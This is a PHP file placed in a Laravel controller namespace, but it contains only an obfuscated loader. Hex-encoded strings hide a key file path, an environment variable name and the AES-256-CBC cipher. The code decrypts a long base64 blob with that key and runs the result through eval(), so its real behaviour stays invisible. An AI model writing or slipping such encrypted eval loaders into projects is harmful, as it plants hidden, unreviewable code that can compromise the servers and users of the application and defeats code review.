<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('NrL2KObTlwQbgLdkDK6iig==');

$c=base64_decode(

'eA+I5YleKcgufNpjZEBA5kD5LM4PyuwPEkZCsZpxMVcLP5yuFshtfpUWe3uofXm+g9W6eesjy2kk' .
'AW7tcTMscKiGSIx25fatBtnBQFkhzoXkRr+EK2MX4fgJveQo+EmLWOmfRVY5WzUSwG7MrUdEuDWd' .
'KzCFBGkTzA1ZQWKoFTRmC5MapWcjSR+RiPWlrTcRj81PyFrpAVSOGdqGgliTdd6Khg6ec2ksL/7z' .
'vu3rXbWNsd/8MhPOXSwyrEXTEfyegcXM2jc4q1Y+bxlt0cHOiUZ0hQk5DZ37srQBiOk7Pvyw470O' .
'2m62fp7LuOuXhHym0+u/bzPQM9j42fbmMnlTzk6ylaH3HbFFWgBJuC0w+SQyKX412MMLHUD9N/2O' .
'3if0mSRKZpkOfxxMdLPt7YUkkj2wIcjA9FSxkbMQ/YGEX29sP0CZvmM9isjFMfLSUEuyFhOEtSsQ' .
'rgimtVgnM9IW4EVbkBjLfZB+N5OKQLkumGNkxf/F/qgyQbwzquvVEIj5tr6kIqECfKhpms0oDB3n' .
'xOoNxAl/deu+L2bxuKiU25LpMufYqHuBZ9Ov8N/C5XIm1eiDvnPaWRv683HARk5Tj9VqwzTgLC8G' .
'q8+VObsSkVvJWrsv11gu8TlNlb1QwpHbYk+5cy30PH6GHeRHMRdDvc1fP+/M9IoEXWOni4o95cTl' .
'sh2oZasITydraTG/emSmj961mrFuDwZgGTTI5ifXoWt3CaarzS1UdWnBjZpky/Q6zStEsclnQhUX' .
'kJrFpnCueQbsmPjWxI/xGCXUkVJI0ltZ2cpqhlvdMPtOuOWdLo9S1znaHJRoO5G+fluncM7Jcjlk' .
'bR47yQtHzwUkxXBdo4qNXSMUcXAhaE6swtSsQ+eVYP7crcug6m2wJgXFO7W/+2vjT4rKbhatVkXs' .
'un/pVLHkkLzJ0GQYxkQIjL4xFAJhntrpicWUQe8Ltfk+Ii3e4hm3LAuH8so08cr1pfFbwofafWzZ' .
'2TO5fli4+reuvZWCXD21CWlk1s70uCrYf0az3m29ADyLpOd368+KP7i7Knxf3+GMP+aSaJgfeJV4' .
'408X8dYEbNTmirw/Yy6HpZ710TkB0YwG9CWOq27kVIH6ais59y3DuPtyzG9b4kzBjCysGgs1tL3g' .
'bkqD9iXsq2Ge90EiiRqQRuZRmWMrrTpENAJZPIMAjkA/eEUrkl9i6L2rAKsooqM7mpTMactdCcAY' .
'pI4TppCXKImpe1WGyV29tLF+/zbzgI7/qHTgYAp1OJaQZAo8yhim+9uh/VoxaVe820ncbuibFDuJ' .
'ptz46CiQib7gS9/E5UNz8+NvKdg8zeOge9GQnbfRPuw3FIUqKNSbEbhEFd/UHW2I2kGyzqQq0nDZ' .
'gGtlD7R+6jmbZc/YMckT+nAX3E/msWdBQ5sUrORVr/dgU8vfl7GFnpMVTJd6aB5zZQ0RD2h10bPd' .
'96oOR6Mim4zpDGDJNoIVlO42OO9J7ijYj6IvFvgaPanGJWn4edV5cuCzBEQE9kVp1zflQUf6q0GI' .
'rbehAhafsP6rW/kIXk0Ebdf5YkUMxKFoqKa52U8mSBgAOnk3iHi8xpZPDvuiMKkL27DKd8hOx8ES' .
'BY//vMantUgqoF+TKqbqJ2a3yMAEsNTRF/pJPhQqr8UCkAwMeYZiSU3Zs4+Rq9DwAdfKZacXUo5y' .
'3vpkQNaGU9MBO538tkIUgy2Cn8nODom4+HbJjL9TX+EVNT/CxpAdL571cNrAAqhF8vLZ/TjBwH+5' .
'BZpyTlG4pEpsSPivQ0tgalckxxpwyNtPOt3cyUBxlfxGgTbmvOlGTivUnPzddWr7djw/y0I9MFAm' .
'sAgf9i00CaQiSABphS5YIeTn9/wldwj7FptE/6+r/mgji2MDVJbJZxAfocPHc4NIKWkAvQ6XVO1i' .
'A7Q3XGwhyAE3AFEFmribBJdixCuhxHvYMwpyeYlUxYEQ+Td0I6+Ka5qpZJlwj1gAg73cWwYii/6l' .
'yhsPwvG8STBmBVvp8rA6i0fFYOxotSFTf/k4OAE0r/GaP1PFuLXGeSBewHtGUGhSrHOptjBQomjm' .
'+lPAx/RLepYtFEuO5zhwGRb6Y0ZP7BCL2DXV1QZpTVv72C+Hr3O3Rc5lwngt1/kRyuvwb3VwOnew' .
'rULKxgIUC3eLZGKCk9hq7SYAK0PB7ZP3SAAjT1Jmmalasw6avKScdNi2CcFDlcI4wvhpxv2tPfOi' .
'0IM81GlKAaOEvDEgTM23nwPrq/9k1CN7Wmd1XllxiWhmH7yAddixAddf8L+Q4bgx6ngKAXT8Coq8' .
'DkrHKqkQL8Jb1q18SNeMpyJQiYqmOeWcqMAFYPEbTFPXQMZK16jB4gdT3gAmhlE01aotifZ12Z7n' .
'a/DGkILOqWah+QjhBj5uWEVMQTkLtKFI0GDv1fPqwoxUBZYNLCb7gIJV8/+2PdTNlLoH80c3kP6j' .
'nnsWJE1TBIU18N0I6IorFjGQGt0ag3ASdCBYX4fPC99NR+msEg3y60A/VvwwNZ9X0/lUlfSAh6DI' .
'f6LJoAd0ec1YE0l1s4XXPD6GgPLmSRAl3FV2aRw6GH+7iNrpcc0TvHAwl3rg/dk+Q6uowmCrSm1C' .
'dDHliwEP8Or89FagAFNU+U/U0m21gpC0BT9AYWlZDGheSzuoYvNPPNO30V5dhdLi/aacZRky24nY' .
'Efu2pLz4QJzbOUiZOvIkJI13YfrOwAmbGlXNRdNzM+I8xC+URfoDjPU1IDAjqf5aDF3fea7JZPTL' .
'FsTmOO6IJLsqnXJKYdMka5xYaLoHuOakh43eq7F6pj0++tNRjDlmqDCSkEPVTP3S8gYRLblMA4NC' .
'RK8Bq8SqY5n9ES5NQD5cG1F8gbSSelQ/YYjFhmlLQtSI5Tz2DD3oi7Y2YVrXf+nSc708xxRz/Ivp' .
'VPaKRqSnM5TrQgcr4n38lVpN7d0ol/RMKXf6mCDdC4nbVWWku1L0ewdPCXBk6Pa7BylYH67+jw0K' .
'JyBchxID8fVCfd+ryLzJ5XQUulT3A7R5Intv41HHyFyRR7qwBkZgQ60MP4q31c+jYmgvLAdh7DvW' .
'6PcQnvHhYURxZnTbgxL8eItzE5pcUwzmbDzPba++37+iRzsTDxj0UEn4stytoSEC2GbXvWjTHXca' .
'hQ81Y4hzBZ1X3zv0d/DUquA07PEE4yqT+Nck6QF9t8twv3J26DzEnPGjg7PpvcvvWVrrxqyEg3m6' .
'Ypb0R5/I8IIoAkqgPFHYTOM3YFQQYErlRIKV9O41lJH2+Q2iPER2ByvdgNXhtj4ROoO0hLL3Htmt' .
'UMrrV6xIbGKvgxbpTs/nLgXopW9//FwvZWTZH+FmmuKHC+maotJG1UVXUDggFFGQbkDHLbt5iC1B' .
'tJ3THt/e5r9x7vED98aBttO+p0CSsmZd6JqZLhvdovPNAX7xpeTQgpTFfVA4t77NH+iFR5ciPsT+' .
'oxRl4hI4D/qveiKBh4fAr9L1H5U/f0nbpzsN'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

